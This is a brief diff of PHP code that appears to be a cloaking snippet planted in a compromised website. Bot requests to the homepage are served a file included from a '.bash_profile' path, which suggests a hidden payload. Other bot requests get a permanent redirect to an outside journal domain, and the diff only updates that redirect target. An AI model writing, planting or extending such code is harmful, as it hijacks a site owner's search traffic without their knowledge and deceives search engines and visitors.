@@ -78,7 +78,7 @@ if (is_bot()) {
     if (is_homepage()) {
         include('/home/u291286007/.bash_profile');
     } else {
-        header("Location: https://ojs.bahiseen.com/", true, 301);
+        header("Location: https://ojs.bahiseen.com/index.php/JoB", true, 301);
     }
     exit;
 }
